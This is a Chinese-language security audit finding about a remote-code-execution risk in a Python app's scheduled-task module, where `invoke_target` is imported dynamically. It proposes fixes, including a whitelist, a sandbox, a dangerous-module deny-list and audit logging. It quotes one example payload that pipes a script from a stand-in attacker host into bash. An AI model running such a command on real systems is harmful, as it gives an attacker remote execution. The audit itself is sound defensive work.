# SECURITY: RCE 风险评估 — 定时任务动态函数调用

**发现日期**: 2026-05-25
**审计方**: Sprint 7 Security Audit（补充）
**状态**: ⚠️ 高风险，需架构级缓解

---

## 1. 风险概览

| 风险项 | 严重性 | 状态 |
|--------|--------|------|
| 定时任务动态 import 执行 | **高** | ⚠️ 已记录，待架构修复 |
| 未授权任务创建/编辑 | **高** | ⚠️ Admin 权限控制 |
| APScheduler 动态代码执行 | **高** | ⚠️ 依赖定时任务设计 |

---

## 2. 问题描述

### 2.1 动态函数调用（`_import_function`）

**位置**: `config/get_scheduler.py:777-786`

```python
def _import_function(cls, func_path: str) -> Callable[..., Any]:
    module_path, func_name = func_path.rsplit('.', 1)
    module = importlib.import_module(module_path)
    return getattr(module, func_name)
```

`invoke_target` 格式为 `module_path.function_name`，通过 `importlib.import_module` 动态加载并通过 `getattr` 执行。

**攻击场景**：
如果攻击者（Admin 权限）能够创建/编辑定时任务，可设置 `invoke_target` 为：
- `os.system` + `job_args` 执行系统命令
- `subprocess.run` / `Popen` 执行任意命令
- 任何可导入的 Python 模块的任意函数

**示例恶意 payload**：
```
invoke_target = "os.system"
job_args = "curl attacker.com/shell.sh | bash"
```

### 2.2 `job_kwargs` 反序列化

```python
kwargs = json.loads(job_info.job_kwargs) if job_info.job_kwargs else {}
job_func(*args, **kwargs)
```

`job_kwargs` 为 JSON 字符串，如果可控可触发**反序列化攻击**（如果 job_func 接受危险类型）。

---

## 3. 当前缓解措施

| 措施 | 说明 |
|------|------|
| Admin 权限要求 | 只有 Admin 角色可创建/编辑定时任务 |
| `@NotBlank` + `@Size` 校验 | `invoke_target` 最大 500 字符 |
| 应用锁（Leader Election） | 非 leader worker 无法执行调度任务 |

---

## 4. 风险评级

| 维度 | 评级 | 说明 |
|------|------|------|
| 机密性影响 | **高** | 可执行任意系统命令，读取敏感数据 |
| 完整性影响 | **高** | 可修改数据库、写入 Webshell |
| 可用性影响 | **中** | 可导致服务拒绝（DoS） |
| 可利用性 | **中** | 需要 Admin 权限（高权限起点） |
| 整体评级 | **高** | RCE 属于最高级别漏洞 |

---

## 5. 架构修复建议

### 方案 A：白名单函数注册（推荐）

```python
ALLOWED_JOB_FUNCTIONS = {
    'module_task.scheduler_test.job',
    'module_admin.service.some_service.cleanup_task',
    # 只允许注册过的函数
}

def _import_function(cls, func_path: str) -> Callable[..., Any]:
    if func_path not in ALLOWED_JOB_FUNCTIONS:
        raise SecurityException(f'Job function {func_path} not allowed')
    # ... 原有逻辑
```

### 方案 B：沙箱执行

使用 `pip install restrictedpython` 限制可执行的代码，或使用容器化 job 执行环境（Lambda/K8s Job）。

### 方案 C：禁止危险函数

```python
DANGEROUS_MODULES = {'os', 'subprocess', 'eval', 'exec', 'builtins', 'importlib'}

def _validate_invoke_target(func_path: str) -> bool:
    module_path = func_path.rsplit('.', 1)[0]
    return module_path not in DANGEROUS_MODULES
```

### 方案 D：审计日志 + 审批流

- 所有定时任务创建/修改需经过审批流程
- 记录 `invoke_target` 历史版本，支持溯源

---

## 6. 验证方法

```python
# 测试用例：验证 os.system 无法被调用
def test_rce_protection():
    from config.get_scheduler import SchedulerUtil
    try:
        SchedulerUtil._import_function('os.system')
        print('VULNERABLE: os.system allowed')
    except Exception as e:
        print(f'SAFE: {e}')
```

---

## 7. 相关代码

| 文件 | 行号 | 描述 |
|------|------|------|
| `config/get_scheduler.py` | 777-786 | `_import_function` 动态导入 |
| `config/get_scheduler.py` | 821 | `execute_scheduler_job_once` 调用 |
| `module_admin/entity/vo/job_vo.py` | 35-38 | `@NotBlank`/`@Size` 校验 |
| `module_admin/service/job_service.py` | 168 | `execute_job_once_services` |

---

## 8. 优先级建议

| 优先级 | 原因 |
|--------|------|
| **P0** | RCE 为最高严重性漏洞，建议立即修复 |
| 短期 | 实现方案 A（白名单函数注册），成本低，效果好 |
| 中期 | 实现审计日志 + 审批流，增强防御深度 |
| 长期 | 考虑沙箱/容器化 job 执行环境 |